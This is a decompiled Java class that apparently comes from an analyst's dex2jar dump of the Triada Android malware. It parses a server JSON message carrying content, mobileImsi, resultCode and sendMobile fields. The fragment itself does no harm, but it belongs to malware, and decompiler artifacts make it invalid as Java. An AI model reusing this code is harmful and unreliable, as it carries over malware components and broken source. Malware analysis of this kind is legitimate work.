package com.android.essdk.eyou.e.a;

import com.android.essdk.eyou.e.b;
import org.json.JSONException;
import org.json.JSONObject;

public class c {
  public static a a(String paramString) {
    b.b("INIT_PARSER", "mess is [" + paramString);
    if (paramString != null) {
      try {
        JSONObject jSONObject = new JSONObject();
        this(paramString);
        a a = new a();
        this();
        try {
          a.c(jSONObject.getString("content"));
          a.d(jSONObject.getString("mobileImsi"));
          a.a(jSONObject.getString("resultCode"));
          a.b(jSONObject.getString("sendMobile"));
          return a;
        } catch (JSONException jSONException) {}
      } catch (JSONException jSONException) {
        jSONException = null;
      } 
    } else {
      return null;
    } 
    b.b("INIT_PARSER", "初始化json串解析出错。");
    return (a)paramString;
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/e/a/c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */